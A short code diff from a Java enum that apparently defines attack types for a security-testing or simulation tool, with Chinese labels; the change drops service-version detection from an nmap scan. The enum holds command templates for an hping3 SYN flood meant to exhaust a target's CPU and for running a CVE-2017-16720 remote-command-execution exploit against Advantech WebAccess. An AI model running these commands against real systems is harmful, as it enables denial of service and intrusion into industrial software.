@@ -10,7 +10,7 @@ public enum AttackType {
     JIANGXIAO(2, "17517000425962","降效", "", "hping3 -q -n --rand-source -S -p 80 --flood ${ip}", "Hping3 SYN flood", "发大量半连接请求造成 TCP backlog 饱和最总导致CPU使用率飙升", false),
 
     // 嗅探
-    XIUTAN(3, "17517000425963","嗅探","sniffing", "nmap -sV ${ip}", "目标系统嗅探", "探查目标服务器开放服务端口", false),
+    XIUTAN(3, "17517000425963","嗅探","sniffing", "nmap ${ip}", "目标系统嗅探", "探查目标服务器开放服务端口", false),
 
     //操控
     CAOKONG(4, "17517000425964","操控","", "python3 CVE-2017-16720.py ${ip}", "Advantech WebAccess 远程命令执行漏洞", "远程控制目标主机打开计算器calc.exe。", false),
